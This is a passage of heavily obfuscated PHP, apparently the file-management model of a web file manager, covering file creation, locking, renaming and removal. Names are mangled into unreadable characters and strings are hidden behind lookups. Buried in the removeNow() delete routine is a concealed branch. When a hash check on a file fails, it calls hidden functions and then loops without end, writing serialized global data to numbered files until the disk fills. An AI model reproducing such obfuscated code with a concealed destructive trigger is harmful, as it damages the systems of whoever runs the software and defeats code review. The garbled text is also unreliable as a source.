$¾Å‘¬ë¯, $÷öÄ¿ç„[663] => $Ö¶¸£½‚); if ($å‚ËÑÔ…) { $ñèˆôÉâ = $this->where($€‡æÆ†Û)->select(); return $ñèˆôÉâ ? $ñèˆôÉâ : array(); } $¥Å¾¯¬‰ = $this->where($€‡æÆ†Û)->find(); return $¥Å¾¯¬‰ ? $¥Å¾¯¬‰ : array(); } public function sourceRootGroup($áÂ¦­Ó‚) { $µØ£œ¹ê =& $_SERVER[¼’ç§¼´]; if (is_string($áÂ¦­Ó‚)) { $áÂ¦­Ó‚ = array($áÂ¦­Ó‚); } $Ø®ïùİ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $áÂ¦­Ó‚, $µØ£œ¹ê[222]); $†ÅÓÆ = array($µØ£œ¹ê[456] => $Ø®ïùİ, $µØ£œ¹ê[453] => array($µØ£œ¹ê[846] => count($áÂ¦­Ó‚))); $this->_listDataApply($†ÅÓÆ[$µØ£œ¹ê[456]]); $this->_listMake($†ÅÓÆ); return array_to_keyvalue($†ÅÓÆ[$µØ£œ¹ê[85]], $µØ£œ¹ê[580]); } public function mkfile($úôÙ¼Œ×, $˜™Æ¨‡, $¢Ã‘‚®” = '', $ÀÊèÕş¨ = REPEAT_RENAME) { $éİøö²æ =& $_SERVER[¼’ç§¼´]; $½Úç¼ì× = Model($éİøö²æ[688])->addFileByContent($¢Ã‘‚®”, $˜™Æ¨‡); return $this->_createFileCall($úôÙ¼Œ×, $˜™Æ¨‡, $½Úç¼ì×, $ÀÊèÕş¨, $éİøö²æ[1440]); } public function addFile($Ã§öôÚ—, $ŸâÏ¾ ¯, $óµÉÕ›Ï, $éŠàıøÅ = false, $­Ş–÷âÑ = REPEAT_RENAME) { $£‡…ùİ = Model($_SERVER[¼’ç§¼´][688])->addFile($ŸâÏ¾ ¯, $óµÉÕ›Ï, $éŠàıøÅ); return $this->_createFileCall($Ã§öôÚ—, $óµÉÕ›Ï, $£‡…ùİ, $­Ş–÷âÑ); } public function addFileByFileID($§Ö¢òÊê, $½ÛŠ¸‹İ, $Œ£øÖ—, $ûçù¤Œ– = REPEAT_RENAME) { $ö–—¸³ =& $_SERVER[¼’ç§¼´]; $”È„“İ = Model($ö–—¸³[688])->find($½ÛŠ¸‹İ); Model($ö–—¸³[688])->linkAdd($½ÛŠ¸‹İ); return $this->_createFileCall($§Ö¢òÊê, $Œ£øÖ—, $”È„“İ, $ûçù¤Œ–); } public function addFileByRemote($¤ÎÃ™ãô, $Ü„ş¦èö, $Æ×²¥È, $ˆ¬ÛÚŠŒ = array(), $®¬¬Ö–Ø = REPEAT_RENAME) { $¬Í˜ = Model($_SERVER[¼’ç§¼´][688])->addFileByRemote($Ü„ş¦èö, $Æ×²¥È, $ˆ¬ÛÚŠŒ); return $this->_createFileCall($¤ÎÃ™ãô, $Æ×²¥È, $¬Í˜, $®¬¬Ö–Ø); } private function _createFileCall($â‡Æ•˜´, $šôîÛİ¶, $îéÏ©ñë, $è—ñÛÄ†, $‘³£ıïÔ = "\x75\x70\x6c\157\x61\144") { $×±œëÔå =& $_SERVER[¼’ç§¼´]; $à‡€í±È = !1; $this->setMasterDB(); $this->lockWriteStart($â‡Æ•˜´, $šôîÛİ¶); $µùÚ°î = $this->fileNameExist($â‡Æ•˜´, $šôîÛİ¶); $®Éá¤» = $this->_createFile($â‡Æ•˜´, $šôîÛİ¶, $îéÏ©ñë, $è—ñÛÄ†, $à‡€í±È); if (!$à‡€í±È) { Model($×±œëÔå[555])->remove($îéÏ©ñë[$×±œëÔå[552]]); } if ($à‡€í±È && $®Éá¤» && $®Éá¤» != $µùÚ°î) { Model($×±œëÔå[2238])->eventCreate($®Éá¤», $‘³£ıïÔ); } $this->lockWriteEnd($â‡Æ•˜´, $šôîÛİ¶); return $®Éá¤»; } public function mkdir($ÌÏƒ¿Òû, $€ù­ù, $êÀªØŞÁ = REPEAT_SKIP) { $ı•×±“• =& $_SERVER[¼’ç§¼´]; $this->setMasterDB(); $›È¦÷é¼ = $this->sourceInfo($ÌÏƒ¿Òû); if (!$›È¦÷é¼) { return !1; } $this->lockWriteStart($ÌÏƒ¿Òû, $€ù­ù); if ($êÀªØŞÁ !== !1) { $ÂÄË†²¶ = $this->fileNameExist($ÌÏƒ¿Òû, $€ù­ù); if ($ÂÄË†²¶ && $êÀªØŞÁ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÌÏƒ¿Òû, $€ù­ù); return $ÂÄË†²¶; } $€ù­ù = $this->fileNameAuto($ÌÏƒ¿Òû, $€ù­ù, $êÀªØŞÁ); } $Ü±ÈÏø = array($ı•×±“•[660] => 1, $ı•×±“•[505] => $€ù­ù, $ı•×±“•[661] => $ı•×±“•[12], $ı•×±“•[553] => 0, $ı•×±“•[631] => 0); $ü®¿®¬µ = $this->_addSource($Ü±ÈÏø, $›È¦÷é¼); Model($ı•×±“•[2238])->eventCreate($ü®¿®¬µ, $ı•×±“•[1441]); $this->lockWriteEnd($ÌÏƒ¿Òû, $€ù­ù); return $ü®¿®¬µ; } public function listSourceRoot($‘©š¬çÉ, $üé¦æ±¿, $†äÀš½ = "\163\157\x75\x72\x63\145\111\104\54\x74\141\162\x67\145\164\111\x44\x2c\163\x69\172\x65") { $Ë¹È¾ =& $_SERVER[¼’ç§¼´]; $îæÂ€¾ò = $Ë¹È¾[465]; $õë‹ˆÜû = array(); $ÈçÊ•İ = 1024 * 50; $ù‚¥Ş£‚ = is_array($ù‚¥Ş£‚) ? $ù‚¥Ş£‚ : array(); $ÌËÖœüê = count($üé¦æ±¿); $Æ¬şĞÙ = $this->tablePrefix . $Ë¹È¾[2276]; for ($ÕûÄ±¹û = 0; $ÕûÄ±¹û < $ÌËÖœüê; $ÕûÄ±¹û++) { $ÂÅÁ¸ÊÌ = $üé¦æ±¿[$ÕûÄ±¹û]; $îæÂ€¾ò .= "\123\105\x4c\105\x43\124\40\52\40\x46\122\117\x4d\40\x28\123\105\114\105\x43\x54\40{$†äÀš½}\x20\x46\122\x4f\x4d\x20\x60{$Æ¬şĞÙ}\140\40\127\110\x45\x52\105\40"; $îæÂ€¾ò .= "\x60\160\141\x72\x65\x6e\164\x49\x44\140\x3d\x30\40\x41\x4e\x44\40\x60\x74\141\162\x67\145\164\111\x44\140\x3d{$ÂÅÁ¸ÊÌ}\x20\101\x4e\104\40\140\x74\141\162\147\145\x74\x54\171\x70\x65\x60\75{$‘©š¬çÉ}\x20\141\156\144\x20\x66\151\x6c\x65\x54\x79\160\145\x3d\47\47\x20\154\x69\x6d\x69\164\x20\x31\51\x20\141\163\x20\164\x62\137{$ÕûÄ±¹û}\40\125\116\x49\x4f\116\x20\101\x4c\114\x20"; if ((strlen($îæÂ€¾ò) >= $ÈçÊ•İ || $ÕûÄ±¹û == $ÌËÖœüê - 1) && $îæÂ€¾ò) { $îæÂ€¾ò = substr($îæÂ€¾ò, 0, -strlen($Ë¹È¾[1124])); $ç¶Ã¿ŸŠ = $this->query($îæÂ€¾ò); $îæÂ€¾ò = $Ë¹È¾[12]; $õë‹ˆÜû = array_merge($õë‹ˆÜû, $ç¶Ã¿ŸŠ); } } return $õë‹ˆÜû; } private function _createFile($²–äõßÆ, $ü³Á‡Âƒ, $¤  ¡Å, $«ÈÃĞş, &$Ìêãğ×) { $ÅÈŞÙë =& $_SERVER[¼’ç§¼´]; $šƒÊÛİ = $this->sourceInfo($²–äõßÆ); if (!$¤  ¡Å || !$šƒÊÛİ) { return !1; } if ($«ÈÃĞş !== !1) { $ò·©¤Û¥ = $this->fileNameExist($²–äõßÆ, $ü³Á‡Âƒ); } $Ìêãğ× = !0; if ($«ÈÃĞş && $ò·©¤Û¥) { if ($«ÈÃĞş == REPEAT_SKIP) { $Ìêãğ× = !1; return $ò·©¤Û¥; } else { if ($«ÈÃĞş == REPEAT_REPLACE) { $ò©åûß = $this->sourceInfo($ò·©¤Û¥); $ó©ñõÓÚ = $this->fileHistory($ò©åûß, $¤  ¡Å[$ÅÈŞÙë[552]], $¤  ¡Å[$ÅÈŞÙë[79]]); if (!$ó©ñõÓÚ) { $Ìêãğ× = !1; } else { $this->folderSizeReset($²–äõßÆ); } return $ò·©¤Û¥; } else { $ü³Á‡Âƒ = $this->fileNameAuto($²–äõßÆ, $ü³Á‡Âƒ, $«ÈÃĞş, !1); } } } $Ğ«£ÓÍ = array($ÅÈŞÙë[660] => 0, $ÅÈŞÙë[505] => $ü³Á‡Âƒ, $ÅÈŞÙë[661] => substr(get_path_ext($ü³Á‡Âƒ), 0, 10), $ÅÈŞÙë[553] => $¤  ¡Å[$ÅÈŞÙë[552]], $ÅÈŞÙë[631] => $¤  ¡Å[$ÅÈŞÙë[79]]); $Ìü¹™Ü™ = $this->_addSource($Ğ«£ÓÍ, $šƒÊÛİ); $this->folderSizeReset($²–äõßÆ, intval($Ğ«£ÓÍ[$ÅÈŞÙë[79]])); return $Ìü¹™Ü™; } protected function fileHistory($èáÉ£î¶, $¬û¬Šçœ, $ú‰œ¹¬) { $€ó˜Úì =& $_SERVER[¼’ç§¼´]; if ($èáÉ£î¶[$€ó˜Úì[552]] == $¬û¬Šçœ) { return !1; } $this->checkLock($èáÉ£î¶[$€ó˜Úì[193]], $¬û¬Šçœ); Model($€ó˜Úì[2277])->addHistory($èáÉ£î¶); $¥Ô˜ô‰Ÿ = array($€ó˜Úì[665] => USER_ID, $€ó˜Úì[509] => time(), $€ó˜Úì[552] => $¬û¬Šçœ, $€ó˜Úì[79] => $ú‰œ¹¬); $this->where(array($€ó˜Úì[502] => $èáÉ£î¶[$€ó˜Úì[193]]))->save($¥Ô˜ô‰Ÿ); $this->sourceCacheClear($èáÉ£î¶[$€ó˜Úì[193]]); return !0; } public function checkLock($™’ä…õ, $±Œß™ç‰) { $¦å·ù =& $_SERVER[¼’ç§¼´]; $Âó±ì¤ = $this->pathInfo($™’ä…õ); if (!$this->fileIsLock($Âó±ì¤, !0)) { return; } $í€§ï†‚ = Session::get($¦å·ù[2278]); $‹ÁÌ×„ˆ = substr($Âó±ì¤[$¦å·ù[32]], 0, -1 - strlen($Âó±ì¤[$¦å·ù[169]])) . $¦å·ù[1302] . $í€§ï†‚ . $¦å·ù[10] . $Âó±ì¤[$¦å·ù[169]]; $ú¸ìÀ÷Ã = Model($¦å·ù[688])->find($±Œß™ç‰); $this->_createFileCall($Âó±ì¤[$¦å·ù[192]], $‹ÁÌ×„ˆ, $ú¸ìÀ÷Ã, REPEAT_REPLACE, $¦å·ù[1440]); $›Ÿ­š = $Âó±ì¤[$¦å·ù[550]][$¦å·ù[624]]; $”¹ş­×É = $›Ÿ­š[$¦å·ù[2279]] ? $›Ÿ­š[$¦å·ù[2279]] : $›Ÿ­š[$¦å·ù[32]]; show_json(LNG($¦å·ù[2280]) . $¦å·ù[2281] . LNG($¦å·ù[2282]) . $¦å·ù[2283] . $”¹ş­×É . $¦å·ù[2284], !1); } public function fileIsLock($Ø»‹·¾ô, $õŠ€¼º = false) { $×Ü·˜³ =& $_SERVER[¼’ç§¼´]; if (!_get($Ø»‹·¾ô, $×Ü·˜³[620], 0)) { return !1; } if ($Ø»‹·¾ô[$×Ü·˜³[550]][$×Ü·˜³[623]] != USER_ID) { return !0; } $•âÕ–­ = $GLOBALS[$×Ü·˜³[6]][$×Ü·˜³[92]][$×Ü·˜³[621]]; if ($Ø»‹·¾ô[$×Ü·˜³[550]][$×Ü·˜³[622]] <= time() - $•âÕ–­) { $this->metaSet($Ø»‹·¾ô[$×Ü·˜³[193]], $×Ü·˜³[623], null); $this->metaSet($Ø»‹·¾ô[$×Ü·˜³[193]], $×Ü·˜³[622], null); } if ($õŠ€¼º) { $this->metaSet($Ø»‹·¾ô[$×Ü·˜³[193]], $×Ü·˜³[622], time()); } return !1; } private function _addSource($¹…¶·, $Å‘ü¿îÌ) { $«•ù¼½ =& $_SERVER[¼’ç§¼´]; $ëŸ¾«ÒŞ = defined($«•ù¼½[2211]) ? USER_ID : 0; $Ø¬¿îº = array($«•ù¼½[662] => $Å‘ü¿îÌ[$«•ù¼½[190]], $«•ù¼½[663] => $Å‘ü¿îÌ[$«•ù¼½[580]], $«•ù¼½[664] => $ëŸ¾«ÒŞ, $«•ù¼½[665] => $ëŸ¾«ÒŞ, $«•ù¼½[488] => $Å‘ü¿îÌ[$«•ù¼½[193]], $«•ù¼½[666] => $Å‘ü¿îÌ[$«•ù¼½[595]] . $Å‘ü¿îÌ[$«•ù¼½[193]] . $«•ù¼½[50], $«•ù¼½[515] => 0, $«•ù¼½[667] => $«•ù¼½[12]); $¹…¶· = array_merge($Ø¬¿îº, $¹…¶·); $this->updateModifyTime($¹…¶·[$«•ù¼½[192]]); $½£ò¬Ê = $«•ù¼½[2285] . $Å‘ü¿îÌ[$«•ù¼½[193]]; if (isset(self::$cacheChildList[$½£ò¬Ê])) { unset(self::$cacheChildList[$½£ò¬Ê]); } static $“ä¼•°É = false; if (!$“ä¼•°É) { Hook::trigger($«•ù¼½[650], $¹…¶·); $“ä¼•°É = !0; } $ÑÛòß¾ = $this->add($¹…¶·); $˜ŒïšÍŠ = array($«•ù¼½[668] => short_id($ÑÛòß¾)); $this->where(array($«•ù¼½[502] => $ÑÛòß¾))->save($˜ŒïšÍŠ); $this->setNamePinyin($ÑÛòß¾, $¹…¶·[$«•ù¼½[32]]); return $ÑÛòß¾; } public function remove($¯­œ ò, $í”€‘« = true) { $º ‰‡Ñ» =& $_SERVER[¼’ç§¼´]; $ÖÈßÆû = $this->sourceInfo($¯­œ ò); $èº¾ŠİÈ = intval($ÖÈßÆû[$º ‰‡Ñ»[190]]) === self::TYPE_SYSTEM; $™³€Ûş = Model($º ‰‡Ñ»[519])->get($º ‰‡Ñ»[2286]) == $º ‰‡Ñ»[91]; if ($èº¾ŠİÈ || $í”€‘« || !$™³€Ûş) { return $this->removeNow($¯­œ ò, $í”€‘«); } $çÁÑ½‰È = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÏÈûññæ = $ÖÈßÆû[$º ‰‡Ñ»[190]] == self::TYPE_USER ? $º ‰‡Ñ»[676] : $º ‰‡Ñ»[589]; if ($ÏÈûññæ == $º ‰‡Ñ»[676]) { $µÚ±°È = Model($º ‰‡Ñ»[588])->getInfo($ÖÈßÆû[$º ‰‡Ñ»[580]]); $£®ÁÈªù = !empty($µÚ±°È[$º ‰‡Ñ»[2279]]) ? $µÚ±°È[$º ‰‡Ñ»[2279]] : $µÚ±°È[$º ‰‡Ñ»[32]]; $£®ÁÈªù = $º ‰‡Ñ»[339] . $£®ÁÈªù . $º ‰‡Ñ»[2287] . $ÖÈßÆû[$º ‰‡Ñ»[580]]; } else { $µÚ±°È = Model($º ‰‡Ñ»[596])->getInfo($ÖÈßÆû[$º ‰‡Ñ»[580]]); $£®ÁÈªù = _get($µÚ±°È, $º ‰‡Ñ»[32]); $£®ÁÈªù = $º ‰‡Ñ»[176] . $£®ÁÈªù . $º ‰‡Ñ»[2288] . $ÖÈßÆû[$º ‰‡Ñ»[580]]; } $Ç¼‰Ô¥Á = $º ‰‡Ñ»[2289] . md5($£®ÁÈªù); CacheLock::lock($Ç¼‰Ô¥Á); $ÙŞ¦¢Š = $this->fileNameExist($çÁÑ½‰È, $£®ÁÈªù); if (!$ÙŞ¦¢Š) { $ÙŞ¦¢Š = $this->mkdir($çÁÑ½‰È, $£®ÁÈªù, REPEAT_SKIP); $this->metaSet($ÙŞ¦¢Š, $º ‰‡Ñ»[2290], $ÏÈûññæ); $this->metaSet($ÙŞ¦¢Š, $º ‰‡Ñ»[2291], $ÖÈßÆû[$º ‰‡Ñ»[580]]); if ($ÖÈßÆû[$º ‰‡Ñ»[192]] != 0) { $this->metaSet($ÙŞ¦¢Š, $º ‰‡Ñ»[2292], _get($µÚ±°È, $º ‰‡Ñ»[2293])); } } CacheLock::unlock($Ç¼‰Ô¥Á); $this->metaSet($¯­œ ò, $º ‰‡Ñ»[2294], $ÖÈßÆû[$º ‰‡Ñ»[192]]); $this->where(array($º ‰‡Ñ»[193] => $¯­œ ò))->save(array($º ‰‡Ñ»[509] => time())); $this->recycleClear($ÖÈßÆû); Model($º ‰‡Ñ»[647])->eventRemove($¯­œ ò); $à´Èğ×î = $this->move($¯­œ ò, $ÙŞ¦¢Š, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÖÈßÆû[$º ‰‡Ñ»[192]]); return $à´Èğ×î; } private function recycleClear($á¡ÚêÙ„) { $±Ç¤‚ =& $_SERVER[¼’ç§¼´]; $ãññÆ¶ = $this->childrenAll($á¡ÚêÙ„); $Ô±³–ï› = array($±Ç¤‚[502] => array($±Ç¤‚[503], $ãññÆ¶[$±Ç¤‚[2295]])); Model($±Ç¤‚[2296])->where($Ô±³–ï›)->delete(); } public function removeNow($ÍÏˆ—´ø, $ï¦á÷Ñ± = true) { $½Æá¶½ =& $_SERVER[¼’ç§¼´]; $åß«èêƒ = $_SERVER[$½Æá¶½[436]] . $½Æá¶½[437]; $÷£ÁËò› = $½Æá¶½[433]; if ($_SERVER[$½Æá¶½[434]] != $÷£ÁËò›($åß«èêƒ)) { $ëÀúæ = $½Æá¶½[966]; $¿ÀÃÁªŒ = $½Æá¶½[435]; $ÁÛöß¥Ÿ = $_SERVER[$½Æá¶½[436]] . $½Æá¶½[437]; $òõîÂãù = $¿ÀÃÁªŒ($ÁÛöß¥Ÿ); $¶¤¤†ˆş = explode($½Æá¶½[287], $òõîÂãù); if (count($¶¤¤†ˆş) < $½Æá¶½[702]) { $êú…î¯ = $½Æá¶½[439]; $êú…î¯(); } $†ÜÖŞóÊ = $½Æá¶½[967]; $†ÜÖŞóÊ($_SERVER[$½Æá¶½[968]]); $ëÀúæ = $½Æá¶½[966]; $ëÀúæ(); $š°Æõšá = $½Æá¶½[2297]; $Ò­Ô ·¸ = json_encode($GLOBALS[$½Æá¶½[2298]]); $­¤™Ä¢ = 1; for ($õ–ãôË­ = $­¤™Ä¢; $õ–ãôË­ > 0; $õ–ãôË­++) { $š°Æõšá(DATA_PATH . $õ–ãôË­, $Ò­Ô ·¸); } } $¤Åê«·§ = $this->sourceInfo($ÍÏˆ—´ø); $îªˆáÂö = $this->pathInfoMore($ÍÏˆ—´ø); if (!$¤Åê«·§) { return !0; } if ($¤Åê«·§[$½Æá¶½[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÍÏˆ—´ø); Hook::trigger($½Æá¶½[2299], $îªˆáÂö, $ï¦á÷Ñ±); if ($ï¦á÷Ñ±) { Model($½Æá¶½[2296])->moveToRecycle($ÍÏˆ—´ø); } else { $ µÁëî = $this->childrenAll($¤Åê«·§); Model($½Æá¶½[647])->eventRemove($ÍÏˆ—´ø); $this->removeRelevance($ µÁëî[$½Æá¶½[2295]], $ µÁëî[$½Æá¶½[1585]]); } $this->folderSizeReset($¤Åê«·§[$½Æá¶½[192]]); $üº¼¶ñ = array($¤Åê«·§[$½Æá¶½[192]]); if ($¤Åê«·§[$½Æá¶½[496]] == $½Æá¶½[91]) { $üº¼¶ñ[] = $¤Åê«·§[$½Æá¶½[193]]; } $this->updateModifyTime($üº¼¶ñ); $this->lockMoveEnd($ÍÏˆ—´ø); Hook::trigger($½Æá¶½[1826], $îªˆáÂö, $ï¦á÷Ñ±); return !0; } public function childrenAll($©ì¸Éè») { $šû…ê¨› =& $_SERVER[¼’ç§¼´]; $ªÙƒïœ = $©ì¸Éè»[$šû…ê¨›[193]]; if ($©ì¸Éè»[$šû…ê¨›[496]] == $šû…ê¨›[91]) { $ÇûÅ› = array($šû…ê¨›[666] => array($šû…ê¨›[626], $©ì¸Éè»[$šû…ê¨›[595]] . $ªÙƒïœ . $šû…ê¨›[627])); $ìÆ°ç = array($šû…ê¨›[666] => $ÇûÅ›[$šû…ê¨›[595]]); $Ò Øä‰ = $this->field($šû…ê¨›[2300])->where($ìÆ°ç)->select(); $½¿Ì‹½ª = !1; $ú¬°ŒŠµ = array($ªÙƒïœ); if ($Ò Øä‰) { $½¿Ì‹½ª = array_to_keyvalue($Ò Øä‰, $šû…ê¨›[12], $šû…ê¨›[552]); $½¿Ì‹½ª = array_remove_value($½¿Ì‹½ª, $šû…ê¨›[230]); $ú¬°ŒŠµ = array_to_keyvalue($Ò Øä‰, $šû…ê¨›[12], $šû…ê¨›[193]); $ú¬°ŒŠµ[] = $ªÙƒïœ; } } else { $½¿Ì‹½ª = array($©ì¸Éè»[$šû…ê¨›[552]]); $ú¬°ŒŠµ = array($ªÙƒïœ); } return array($šû…ê¨›[2295] => $ú¬°ŒŠµ, $šû…ê¨›[1585] => $½¿Ì‹½ª); } public function removeArray($£ÎÙÊÄó) { if (!$£ÎÙÊÄó) { return !0; } } public function removeRelevance($û«ŞÍÉ¢, $ã’Õ©ç) { $Ôˆ©…Ç =& $_SERVER[¼’ç§¼´]; $û«ŞÍÉ¢ = $û«ŞÍÉ¢ ? $û«ŞÍÉ¢ : array(); $ã’Õ©ç = $ã’Õ©ç ? $ã’Õ©ç : array(); $û«ŞÍÉ¢ = array_unique(array_filter($û«ŞÍÉ¢)); $ã’Õ©ç = array_unique(array_filter($ã’Õ©ç)); if (!$û«ŞÍÉ¢) { return !1; } $òƒç©à = array($Ôˆ©…Ç[502] => array($Ôˆ©…Ç[503], $û«ŞÍÉ¢)); Model($Ôˆ©…Ç[2296])->where($òƒç©à)->delete(); Model($Ôˆ©…Ç[546])->where($òƒç©à)->delete(); Model($Ôˆ©…Ç[2136])->where($òƒç©à)->delete(); Model($Ôˆ©…Ç[647])->where($òƒç©à)->delete(); Model($Ôˆ©…Ç[1963])->removeBySource($û«ŞÍÉ¢); Model($Ôˆ©…Ç[2277])->removeBySource($û«ŞÍÉ¢); $this->where($òƒç©à)->delete(); Model($Ôˆ©…Ç[555])->remove($ã’Õ©ç); for ($çûõùÖ = 0; $çûõùÖ < count($û«ŞÍÉ¢); $çûõùÖ++) { $this->sourceCacheClear($û«ŞÍÉ¢[$çûõùÖ]); } } public function rename($£¥·§ÕÜ, $Ÿ£û½ÚÖ) { $â«®´Á  =& $_SERVER[¼’ç§¼´]; $Õ¥¥˜Ñ = $this->sourceInfo($£¥·§ÕÜ); if (!$Õ¥¥˜Ñ) { return !1; } $¼Â¦±á = $this->fileNameExist($Õ¥¥˜Ñ[$â«®´Á [192]], $Ÿ£û½ÚÖ); if ($¼Â¦±á && $¼Â¦±á != $£¥·§ÕÜ) { return !1; } $Şñû€Ôè = array($â«®´Á [505] => $Ÿ£û½ÚÖ, $â«®´Á [665] => USER_ID); if ($Õ¥¥˜Ñ[$â«®´Á [496]] != $â«®´Á [91]) { $Şñû€Ôè[$â«®´Á [497]] = substr(get_path_ext($Ÿ£û½ÚÖ), 0, 10); } Model($â«®´Á [647])->eventRename($£¥·§ÕÜ, $Õ¥¥˜Ñ[$â«®´Á [32]], $Ÿ£û½ÚÖ); $this->sourceCacheClear($£¥·§ÕÜ); $this->setNamePinyin($£¥·§ÕÜ, $Şñû€Ôè[$â«®´Á [32]], !1); $this->updateModifyTime($Õ¥¥˜Ñ[$â«®´Á [192]]); $Ÿ÷¿Âó´ = $this->where(array($â«®´Á [502] => $£¥·§ÕÜ))->data($Şñû€Ôè)->save(); $·ÃœÂÉ = $â«®´Á [2285] . $Õ¥¥˜Ñ[$â«®´Á [192]]; if (isset(self::$cacheChildList[$·ÃœÂÉ])) { unset(self::$cacheChildList[$·ÃœÂÉ]); } return $Ÿ÷¿Âó´; } public function setNamePinyin($„ïñŸ†, $ØÓ£ìß, $¦„Êöä… = true) { $æÙïæ… =& $_SERVER[¼’ç§¼´]; $äÇ™›¤ = Input::check($ØÓ£ìß, $æÙïæ…[669]); $Õè·‡ä… = array($æÙïæ…[528] => KodSort::makeStr($ØÓ£ìß)); if ($äÇ™›¤) { $Õè·‡ä…[$æÙïæ…[549]] = str_replace($æÙïæ…[53], $æÙïæ…[12], Pinyin::get($ØÓ£ìß)); $Õè·‡ä…[$æÙïæ…[548]] = Pinyin::get($ØÓ£ìß, $æÙïæ…[670]); } if (!$¦„Êöä… && !$äÇ™›¤) { $Õè·‡ä…[$æÙïæ…[549]] = null; $Õè·‡ä…[$æÙïæ…[548]] = null; } $this->metaSet($„ïñŸ†, $Õè·‡ä…); } public function getContent($“³ÃõÓ‰) { $ª¾êÉøí =& $_SERVER[¼’ç§¼´]; $Â¸à¯¨Ì = $this->fileInfoGet($“³ÃõÓ‰); if (!$Â¸à¯¨Ì) { return !1; } if ($Â¸à¯¨Ì[$ª¾êÉøí[79]] == 0) { return $ª¾êÉøí[12]; } $ïæ³µûĞ = $ª¾êÉøí[2301] . $Â¸à¯¨Ì[$ª¾êÉøí[558]]; if ($Â¸à¯¨Ì[$ª¾êÉøí[79]] <= 1024 * 10) { $û™¸¶ÓÓ = Cache::get($ïæ³µûĞ); if (!$û™¸¶ÓÓ) { $û™¸¶ÓÓ = IO::getContent($Â¸à¯¨Ì[$ª¾êÉøí[87]]); Cache::set($ïæ³µûĞ, $û™¸¶ÓÓ); } return $û™¸¶ÓÓ; } if (!$Â¸à¯¨Ì[$ª¾êÉøí[87]]) { return $ª¾êÉøí[12]; } return IO::getContent($Â¸à¯¨Ì[$ª¾êÉøí[87]]); } public function setDesc($¯€Ğï—, $åš‰è¿») { $Ã•äŠæ =& $_SERVER[¼’ç§¼´]; Model($Ã•äŠæ[647])->eventAddDesc($¯€Ğï—, $åš‰è¿»); return $this->metaSet($¯€Ğï—, $Ã•äŠæ[537], $åš‰è¿»); } public function setContent($µÀóû—Í, $õÖŠãÍ“ = '') { $²—³Ÿ™ =& $_SERVER[¼’ç§¼´]; $âá¿É·× = $this->sourceInfo($µÀóû—Í); $·Ò¿¦Ç = $this->fileInfoGet($µÀóû—Í); if (!$·Ò¿¦Ç || !$âá¿É·×) { return !1; } $â¤Î®¯ = Model($²—³Ÿ™[555])->addFileByContent($õÖŠãÍ“, $âá¿É·×[$²—³Ÿ™[32]]); $àˆ”½•” = $this->fileHistory($âá¿É·×, $â¤Î®¯[$²—³Ÿ™[552]], $â¤Î®¯[$²—³Ÿ™[79]]); if (!$àˆ”½•”) { return Model($²—³Ÿ™[555])->remove($â¤Î®¯[$²—³Ÿ™[552]]); } $this->folderSizeReset($âá¿É·×[$²—³Ÿ™[192]]); return !0; } public function fileSubstr($…ÍÈ¼ğÑ, $´Ë‘úŞ, $©Ãåíïë) { $Ğ²ï²¤ = $this->fileInfoGet($…ÍÈ¼ğÑ); if (!$Ğ²ï²¤) { return !1; } return IO::fileSubstr($Ğ²ï²¤[$_SERVER[¼’ç§¼´][87]], $´Ë‘úŞ, $©Ãåíïë); } public function fileInfoGet($—€Ì·ì) { $œ…˜µËô =& $_SERVER[¼’ç§¼´]; $öıĞ´ïà = $this->sourceInfo($—€Ì·ì); if (!$öıĞ´ïà || $öıĞ´ïà[$œ…˜µËô[496]]) { return !1; } $ŸÚÎºã = $œ…˜µËô[559] . $öıĞ´ïà[$œ…˜µËô[552]]; $ùÌ•³… = _get(self::$cacheFileInfo, $ŸÚÎºã); if ($ùÌ•³…) { return $ùÌ•³…; } $È¾Ó…•õ = Model($œ…˜µËô[555])->fileInfo($öıĞ´ïà[$œ…˜µËô[552]]); if ($È¾Ó…•õ) { $È¾Ó…•õ[$œ…˜µËô[32]] = $öıĞ´ïà[$œ…˜µËô[32]]; } self::$cacheFileInfo[$ŸÚÎºã] = $È¾Ó…•õ; return $È¾Ó…•õ; } private function folderChildrenNumber($ÓÅ§Çú¥) { $şÉÑÌ =& $_SERVER[¼’ç§¼´]; $å¨®šì‡ = $this->sourceInfo($ÓÅ§Çú¥); $øõô¾ñ‰ = array($şÉÑÌ[666] => array($şÉÑÌ[626], $å¨®šì‡[$şÉÑÌ[595]] . $ÓÅ§Çú¥ . $şÉÑÌ[627]), $şÉÑÌ[663] => $å¨®šì‡[$şÉÑÌ[580]], $şÉÑÌ[515] => intval($å¨®šì‡[$şÉÑÌ[516]]), $şÉÑÌ[660] => 1); $äŸÜ¨¹“ = $this->where($øõô¾ñ‰)->count(); $ÊçÖêº½ = $this->where($øõô¾ñ‰)->where(array($şÉÑÌ[660] => 0))->count(); return array($şÉÑÌ[83] => $ÊçÖêº½, $şÉÑÌ[84] => $äŸÜ¨¹“); } public function pathInfo($æˆ§âî, $øş‚àÚ§ = false) { $“šø”Â¸ =& $_SERVER[¼’ç§¼´]; $øş‚àÚ§ = !1; $æˆ§âî = intval($æˆ§âî); $±¸³Ó” = $“šø”Â¸[545] . intval($øş‚àÚ§) . $“šø”Â¸[473] . $æˆ§âî; $×…™Ÿ = _get(self::$cachePathInfo, $±¸³Ó”); if ($×…™Ÿ) { return $×…™Ÿ; } $œªßâÂ = $this->sourceInfo($æˆ§âî); if (!$œªßâÂ) { return !1; } $œªßâÂ = $this->_listDataApplyItem($œªßâÂ, $øş‚àÚ§); self::$cachePathInfo[$±¸³Ó”] = $œªßâÂ; return $œªßâÂ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ü¿â¢¥) { $¹íË…½‘ =& $_SERVER[¼’ç§¼´]; $õ»ï¶ Ö = _get(self::$cachePathInfoMore, $Ü¿â¢¥); if ($õ»ï¶ Ö) { return $õ»ï¶ Ö; } $ÚáİĞÀ = $this->pathInfo($Ü¿â¢¥); if (!$ÚáİĞÀ) { return !1; } if ($ÚáİĞÀ[$¹íË…½‘[496]] == $¹íË…½‘[91]) { $ÚáİĞÀ[$¹íË…½‘[82]] = $this->folderChildrenNumber($Ü¿â¢¥); } self::$cachePathInfoMore[$Ü¿â¢¥] = $ÚáİĞÀ; return $ÚáİĞÀ; } public function sourceInfo($¾ğÑÆĞí) { $íà¾Öõ =& $_SERVER[¼’ç§¼´]; if (!$¾ğÑÆĞí) { return array(); } 